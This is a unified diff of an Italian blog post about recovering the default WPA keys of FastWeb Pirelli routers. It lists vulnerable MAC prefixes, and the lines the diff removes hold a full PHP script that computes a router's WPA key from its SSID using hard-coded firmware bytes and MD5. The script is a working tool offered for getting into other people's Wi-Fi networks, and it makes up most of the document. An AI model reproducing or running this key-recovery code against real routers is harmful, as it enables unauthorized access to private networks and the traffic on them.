@@ -23,107 +23,21 @@ Vi posto qui di seguito il codice di uno script PHP che, seguendo quell'algoritm
 Ribadisco, come loro, che :
 
 Attualmente è possibile recuperare la chiave Wireless degli Access Point <strong>FastWeb Pirelli</strong>, nello specifico con i seguenti Mac Address:
-<blockquote><em>00:08:27 Pirelli Broadband Solutions
-00:13:C8 </em><em>Pirelli Broadband Solutions</em>
-<em>00:17:C2 Pirelli Broadband Solutions
-00:19:3E P</em><em>irelli Broadband Solutions</em>
-<em>00:1C:A2 </em><em>Pirelli Broadband Solutions</em>
-<em>00:1D:8B </em><em>Pirelli Broadband Solutions</em>
-<em>00:22:33 Pirelli Broadband Solutions
-00:23:8E </em><em>Pirelli Broadband Solutions</em>
-<em>00:25:53 </em><em>Pirelli Broadband Solutions</em>
-<em>00:03:6F </em><em>Telsey S.p.A.</em><em> </em><em>(in fase di Test)
-00:21:96 Telsey S.p.A.</em><em> (in fase di Test)</em></blockquote>
+
+<ul>
+  <li>00:08:27 Pirelli Broadband Solutions</li>
+  <li>00:13:C8 Pirelli Broadband Solutions</li>
+  <li>00:17:C2 Pirelli Broadband Solutions</li>
+  <li>00:19:3E Pirelli Broadband Solutions</li>
+  <li>00:1C:A2 Pirelli Broadband Solutions</li>
+  <li>00:1D:8B Pirelli Broadband Solutions</li>
+  <li>00:22:33 Pirelli Broadband Solutions</li>
+  <li>00:23:8E Pirelli Broadband Solutions</li>
+  <li>00:25:53 Pirelli Broadband Solutions</li>
+  <li>00:03:6F Telsey S.p.A. (in fase di Test)</li>
+  <li>00:21:96 Telsey S.p.A. (in fase di Test)</li>
+</ul>
+
 Detto questo, a breve pubblicherò uno script analogo ma per i router Alice, dato che stanno uscendo lavori anche in questo senso ;)
 
-<pre>
-<code>
-&lt;?php
-/***************************************************************************
- *   FastWeb Pirelli WPA Discovery                                         *
- *   by evilsocket - evilsocket@gmail.com - http://www.evilsocket.net      *
- *                                                                         *
- *   This program is free software; you can redistribute it and/or modify  *
- *   it under the terms of the GNU General Public License as published by  *
- *   the Free Software Foundation; either version 2 of the License, or     *
- *   (at your option) any later version.                                   *
- *                                                                         *
- *   This program is distributed in the hope that it will be useful,       *
- *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
- *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
- *   GNU General Public License for more details.                          *
- *                                                                         *
- *   You should have received a copy of the GNU General Public License     *
- *   along with this program; if not, write to the                         *
- *   Free Software Foundation, Inc.,                                       *
- *   59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.             *
- ***************************************************************************/
-
-/*
- * SSID di partenza.
- */
-$ssid   = "FASTWEB-1-00193EA1B2C3";
-/*
- * 20 byte costanti cablati nel firmware dei Pirelli Fastweb.
- */
-$seq_20 = "\x22\x33\x11\x34\x02\x81\xFA\x22\x11\x41\x68\x11\x12\x01\x05\x22\x71\x42\x10\x66";
-/*
- * Prelevo la parte finale del SSID.
- */ 
-$sn     = split( '-', $ssid );
-$sn     = $sn[2];
-/*
- * La divido in gruppi di due caratteri, formando un array
- * di 6 rappresentazioni esadecimali di byte.
- */
-preg_match_all( "/[a-f0-9]{2}/i", $sn, $sn_bytes );
-$sn_bytes = $sn_bytes[0];
-/*
- * Inizializzo una stringa con il valore intero di questi byte.
- */
-$str = "";
-for( $i = 0; $i &lt; 6; $i++ ){
-    $str .= chr( hexdec( $sn_bytes[$i] ) );
-}
-echo "$str\n";
-
-
-/* 
- * Aggiungo alla stringa i 20 byte "magici".
- */ 
-$str .= $seq_20;
-/*
- * Ricavo i byte dell'hash md5 della stringa
- */
-preg_match_all( "/[a-f0-9]{2}/i", md5($str), $md5_bytes );
-$md5_bytes = $md5_bytes[0];
-$long      = "";
-/*
- * Converto i byte in sequenze binarie di 8 bit.
- */
-foreach( $md5_bytes as $byte ){
-    $long .= sprintf( "%08s", decbin( hexdec($byte) ) );
-}
-/*
- * Divido in 5 gruppi di 5 bit ognuno e, qual'ora il valore intero 
- * di un gruppo sia maggiore di 0x0a, aggiungo 0x57.
- */
-$hex_5 = array();
-for( $i = 0; $i &lt; 25; $i += 5 ){
-    $n       = bindec( substr( $long, $i, 5 ) );
-    $hex_5[] = $n &gt; 0x0a ? $n + 0x57 : $n;
-}
-/*
- * Compongo la chiave.
- */ 
-$wpa = "";
-foreach( $hex_5 as $hex ){
-    $wpa .= sprintf( "%02x", $hex );
-}
-
-print "WPA : $wpa\n";
-
-?&gt;
-</code
-</pre>
-
+<script type="text/javascript" src="http://snipt.net/embed/8b5c6df7d02ecad25dba6cd0c6c5fc57"></script>
